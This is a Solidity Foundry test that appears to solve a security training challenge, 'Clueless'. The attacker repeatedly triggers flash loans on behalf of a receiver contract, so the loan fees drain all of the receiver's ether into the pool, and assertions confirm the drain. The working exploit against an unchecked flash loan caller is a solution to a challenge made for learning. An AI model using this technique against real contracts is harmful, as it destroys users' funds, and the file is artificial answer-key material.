// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/CluelessFixture.sol";

contract CluelessTest is CluelessFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_clueless() public {

        // Act as the attacker for the remainder of the exploit
        vm.startPrank(attacker);
        // The Attacker will get a receiver(User) instance and get a loan with a pool instance to the receiver
        // The contract don't check it who are calling the flashloan, so anyone can call the function
        // In simple words, anyone can make the user ( the owner of the contract) get a loan, using the user coins to pay the fees
        console.log("Pool Balance: ",address(pool).balance);
        for( uint256 i = 0; i < 10; i++ ) { // If the user have 10 ether and the fee is 1 ether, just do a flashloan 10 times 
            console.log(address(receiver).balance);
            pool.flashLoan(address(receiver), 0);
        }
        console.log("User Final Balance: ",address(receiver).balance);
        console.log("Pool Balance: ",address(pool).balance);
        // The attacker don't get the funds, but the user lost all the ether
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The receiver got drained.
        assertEq(address(receiver).balance, 0);
        // The receiver balance got drained to the pool.
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}